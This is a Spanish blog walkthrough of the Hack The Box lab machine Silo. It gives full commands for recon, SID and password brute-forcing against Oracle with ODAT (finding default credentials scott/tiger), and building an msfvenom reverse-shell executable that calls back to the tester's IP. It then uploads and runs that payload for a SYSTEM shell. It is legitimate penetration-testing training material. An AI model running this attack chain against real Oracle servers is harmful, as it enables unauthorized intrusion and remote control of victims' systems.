---
layout: single
title: Máquina Silo - HackTheBox (OSCP Style)
excerpt: "Resolución de la máquina Silo la cual figura en la plataforma con un nivel de dificultad Medium, aunque veremos que es una máquina muy fácil."
date: 2021-09-30
classes: wide
header:
  teaser: /assets/images/silo/portada.png
  teaser_home_page: true
categories:
  - HTB
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

# Información de la máquina

La máquina figura en Hack The Box como una máquina Windows. Su dificultad es Medium, de 30 puntos. Sin embargo, veremos que es una máquina bastante sencilla en la que la intrusión se hará directamente como NT AUTHORITY\SYSTEM

![0]

# Reconocimiento
Iniciamos con una traza ICMP para detectar el Sistema Operativo que corre en el sistema. Por el TTL deducimos que es una máquina Windows (TTL aprox. de 128).

![1]

Por medio de un escaneo de puertos con nmap, detectamos aquellos que se encuentren activos con un estatus **open** en la máquina víctima:

![2]

Vemos que se encuentran habilitados una cantidad considerable de puertos. Sin embargo, los principales serían el 80 (HTTP), 139 y 445 (SMB), 1521 (Oracle DB) y 5985 (WINRM).

Si realizamos un escaneo más exhaustivo en busca de servicios y versiones específicas de dichos puertos, nos encontramos con una gran cantidad de información:

	nmap -sC -sV -p80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 10.10.10.82 -oN targeted
    
![5]

Llama la atención el servicio de Oracle, ya que no la hemos visto anteriormente en otra máquina, así que podría indicar algo. La demás información del escaneo no revela nada de información que sea relevante. Sin embargo, veremos y enumeraremos los servicios uno por uno.

# Servicio HTTP
Solo basta con realizar un escaneo con **whatweb** para revisar si en el sitio web corre algún servicio de interés, como un CMS o versiones vulnerables.

![3]

Sin embargo, la única información que puede ser de relevancia es la versión del IIS que corre en el sistema, la cual es 8.5; lejos de la versión 10.0, que es la más reciente. Sin embargo, de no encontrar otra vulnerabilidad, regresaremos a esto posteriormente.

# Servicio SMB
Dado que el servicio **SMB** se encuentra habilitado en la máquina, primero tratamos de enumerar los recursos compartidos con **ambmap** a los que podamos tener acceso. Dado que no tenemos credenciales, se hace este escaneo con una null session.

	smbmap -H 10.10.10.82 -u 'null'
    
![4]

Sin embargo, no tenemos posibilidad siquiera de listar los recursos con estas credenciales. Descartamos esta aproximación y pasamos al siguiente servicio.

# Oracle DB
Un servicio que llama la atención es el de la base de datos Oracle, ya que desde este podemos realizar ejecución de comandos en el sistema en caso de contar con ciertos requisitos, los cuales son:

* Un SID válido
* Credenciales válidas

Los pasos para hacer pentesting a un servicio de Oracle DB se pueden encontrar en la siguiente entrada de [HackTricks](https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener). Sin embargo, ellos lo realizan por medio de **Metasploit**, de tal forma que nosotros intentaremos seguir los pasos de forma manual (recordemos, todo debe ser estilo OSCP).

Los pasos a seguir son los siguientes:

* Conseguir un SID válido
* Conseguir credenciales válidas
* Ver si tenemos posibilidad de subir archivos
* Crear un exploit con msfvenom para obtener una reverse shell
* Ejecutar el exploit en la máquina y obtener la revere shell

Para realizar este proceso de pentesting, emplearemos la herramienta **ODAT** que se puede encontrar en el siguiente [repositorio de GitHub](https://github.com/quentinhardy/odat). Cabe destacar que para hacerlo funcionar, debemos primero seguir los pasos de instalación que vienen en el apartado **Installation** de su README.

Una vez que esté corriendo correctamente la herramienta, podemos ejecutarla:

	python3 odat.py -s 10.10.10.82
    
![6]

Podemos ver las diferentes opciones de escaneo que la herramienta puede realizar. Podemos ejecutar simplemente la opción **all**, pero para tener control de las salidas y resultados, haremos paso por paso. Primero, necesitamos un SID válido para poder realizar las consultas posteriores. Para ello, empleamos la opción **sidguesser**.

	python3 odat.py sidguesser -s 10.10.10.82
    
![7]

Lo que la herramienta hará, será probar por fuerza bruta SID válidos en el sistema hasta dar con uno válido. Al final, encuentra uno, por lo que podemos detener la herramienta por medio de un CTRL+C.

El SID válido es **XE**.

El siguiente paso será obtener credenciales válidas para realizar la ejecución de comandos dentro del sistema, y esto también se puede hacer por medio de fuerza bruta por medio de un diccionario que la misma herramienta tiene por defecto. Para ello, emplearemos la opción **passwordguesser**. Obsérvese cómo el comando ahora debe incluir la bandera -d de SID.

	python3 odat.py passwordguesser -s 10.10.10.82 -d XE

![8]

El programa logra dar con credenciales válidas: ``scott/tiger``. En este punto, igualmente podemos detener la herramienta. El siguiente paso será intentar subir un exploit a la máquina para su posterior ejecución. Para ello, primero deberemos crear el exploit con **msfvenom**, pero para ello, primero debemos conocer la arquitectura del sistema. Ejecutamos **crackmapexec** para ver la versión del sistema:

![9]

Vemos que la arquitectura del sistema es de 64 bits. Por lo que creamos el exploit con dicha arquitectura en mente:

	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=443 -f exe -o reverse.exe
    
![10]

Ya con el exploit creado para entablar una reverse shell, intentamos subirla al sistema. Para ello, debemos usar la opción **utlfile** y la bandera --putFile. Obsérvese como antes debemos declarar las credenciales obtenidas, y posteriormente, la ruta destino, nombre de archivo destino, y ruta local del archivo.

	python3 odat.py utlfile -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --putFile "/temp" "reverse.exe" "/home/kali/Desktop/HTB/Silo/reverse.exe" --sysdba
    
![11]

En el caso de la ruta destino, puede ser una ruta absoluta (c:\\inetpub\\wwwroot) o una ruta relativa (/temp). Esta última es una ruta característica del servicio Oracle DB, sin embargo, de no poderse colocar en dicha ruta, intentar la primera. Vemos que el resultado es positivo, por lo tanto, solo resta ejecutarlo.

Para ello, emplearemos la opción **externaltable**, la cual cuenta con la bandera --exec.

![12]

Esta bandera solo requiere que le pasemos la ruta donde se encuentra el binario a ejecutar y el nombre de este. En dado caso de que algún comando ejecutado hasta este momento dé error de privilegios insuficientes, debemos agregar la bandera --sysdba.

	python3 odat.py externaltable -s 10.10.10.82 -d XE -U 'scott' -P 'tiger' --exec /temp reverse.exe --sysdba
    
![13]

Para este punto, antes de ejecutar el comando, ya debemos tener un netcat a la escucha para recibir la conexión. Vemos que se ejecuta correctamente y recibimos la reverse shell.

![14]

Lo más curioso, es que recibiremos la shell como el usuario administrador, por lo que escalamos privilegios directamente.

# Flags
Ya como el usuario administrador, solo nos resta obtener las flags de usuario y de root. Como usuario administrador, no tenemos problema ya que podemos acceder a todos los directorios sin problemas. La flag de usuario se encuentra en el directorio del usuario **Phineas**.

![15]

Por último, obtenemos la flag de roor, que se encuentra en el directorio del usuario administrador.

![16]
	
[0]:/assets/images/silo/0.png
[1]:/assets/images/silo/1.png
[2]:/assets/images/silo/2.png
[3]:/assets/images/silo/3.png
[4]:/assets/images/silo/4.png
[5]:/assets/images/silo/5.png
[6]:/assets/images/silo/6.png
[7]:/assets/images/silo/7.png
[8]:/assets/images/silo/8.png
[9]:/assets/images/silo/9.png
[10]:/assets/images/silo/10.png
[11]:/assets/images/silo/11.png
[12]:/assets/images/silo/12.png
[13]:/assets/images/silo/13.png
[14]:/assets/images/silo/14.png
[15]:/assets/images/silo/15.png
[16]:/assets/images/silo/16.png